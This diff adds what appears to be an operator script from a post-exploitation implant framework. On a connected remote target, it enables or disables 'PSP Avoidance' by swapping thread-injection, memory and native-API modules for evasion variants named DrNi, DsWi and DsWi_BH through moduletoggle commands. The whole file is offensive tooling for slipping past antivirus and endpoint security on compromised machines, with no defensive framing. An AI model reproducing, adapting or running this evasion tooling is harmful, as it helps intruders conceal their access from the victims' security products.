@@ -1,0 +1,157 @@
+
+@include "_CommandLine.dsi";
+@include "_VersionChecks.dsi";
+@echo off;
+
+string %params;
+if (!_ParseCommandLine($argc, $argv, %params)) {
+	return false;
+}
+
+if ((defined(%params{'enable'}) && defined(%params{'disable'})) ||
+	(!defined(%params{'enable'}) && !defined(%params{'disable'})))
+{
+    echo("Either -enable or -disable must be specified", ERROR);
+    return false;
+}
+
+if (IsLocal())
+{
+	echo("You must be connected in order to run this script", ERROR);
+	return false;
+}
+
+string $arch, $compiledArch;
+_GetArch($arch);
+_GetCompiledArch($compiledArch);
+bool $wow=false;
+if ($arch != $compiledArch)
+{
+	$wow = true;
+}
+
+struct _TechniqueInfo {
+	string $techName;
+	string $stdName;
+	string $pspName;
+}
+
+_TechniqueInfo @pspTechniques;
+
+if (!defined(%params{'no_drni'}))
+{
+	AddTechnique(@pspTechniques, "Mcl_ThreadInject", "Std", "DrNi");
+	AddTechnique(@pspTechniques, "Mcl_NtMemory",	 "Std",	"DrNi");
+}
+if (!defined(%params{'no_dswi'}))
+{
+	if ($wow)
+	{
+		echo("DSWI is not available for wow environments", ERROR);
+		return false;
+	}
+	
+	if (!defined(%params{"use_bh"}))
+	{
+		AddTechnique(@pspTechniques, "Mcl_NtNativeApi",	 "Win32", "DsWi");
+	}
+	else
+	{
+		AddTechnique(@pspTechniques, "Mcl_NtNativeApi",	 "Win32", "DsWi_BH");
+	}
+}
+
+bool $rtn=true;
+if (defined(%params{'enable'}))
+{
+	echo("----------------------");
+	echo("ENABLING PSP Avoidance");
+	echo("----------------------");
+	if (!EnablePspAvoidanceTechniques(@pspTechniques))
+	{
+		$rtn = false;
+	}
+}
+else
+{
+	echo("-----------------------");
+	echo("DISABLING PSP Avoidance");
+	echo("-----------------------");
+	if (!DisablePspAvoidanceTechniques(@pspTechniques))
+	{
+		$rtn = false;
+	}
+}
+
+if ($rtn)
+{
+	echo("--------------------------------", GOOD);
+	echo("PSP Avoidance changes: SUCCEEDED", GOOD);
+	echo("--------------------------------", GOOD);
+}
+else
+{
+	echo("-----------------------------", GOOD);
+	echo("PSP Avoidance changes: FAILED", ERROR);
+	echo("-----------------------------", GOOD);
+}
+
+return $rtn;
+
+#-------------------------------------------------------------------------------------------
+Sub AddTechnique(REF _TechniqueInfo @pspTechniques, IN string $techName, IN string $std, IN string $psp)
+{
+	int $index = sizeof(@pspTechniques.$techName);
+	@pspTechniques.$techName[$index]	= $techName;
+	@pspTechniques.$stdName[$index]		= $std;
+	@pspTechniques.$pspName[$index]		= $psp;
+}
+
+#-------------------------------------------------------------------------------------------
+Sub DisablePspAvoidanceTechniques(IN _TechniqueInfo @info)
+{
+	bool $rtn=true;
+	for (int $i = 0; $i < sizeof(@info.$techName); $i++)
+	{
+		Execute("Converting @info.$techName[$i] to @info.$stdName[$i]", "moduletoggle -set @info.$stdName[$i] -system @info.$techName[$i]", $rtn);
+	}
+	
+	if (!SetEnv("_PSP_AVOIDANCE_ENABLED", "false"))
+	{
+		$rtn = false;
+	}
+	
+	return $rtn;
+}
+
+#-------------------------------------------------------------------------------------------
+Sub EnablePspAvoidanceTechniques(IN _TechniqueInfo @info)
+{
+	bool $rtn=true;
+	for (int $i = 0; $i < sizeof(@info.$techName); $i++)
+	{
+		Execute("Converting @info.$techName[$i] to @info.$pspName[$i]", "moduletoggle -set @info.$pspName[$i] -system @info.$techName[$i] -load", $rtn);
+	}
+
+	if (!SetEnv("_PSP_AVOIDANCE_ENABLED", "true"))
+	{
+		$rtn = false;
+	}
+	
+	return $rtn;
+}
+
+#-------------------------------------------------------------------------------------------
+Sub Execute(IN string $Description, IN string $Action, REF bool $rtn)
+{
+	echo ($Description);
+	if (`$Action`)
+	{
+		echo ("    PASSED", GOOD);
+	}
+	else
+	{
+		echo ("    FAILED", ERROR);
+		$rtn = false;
+	}
+}
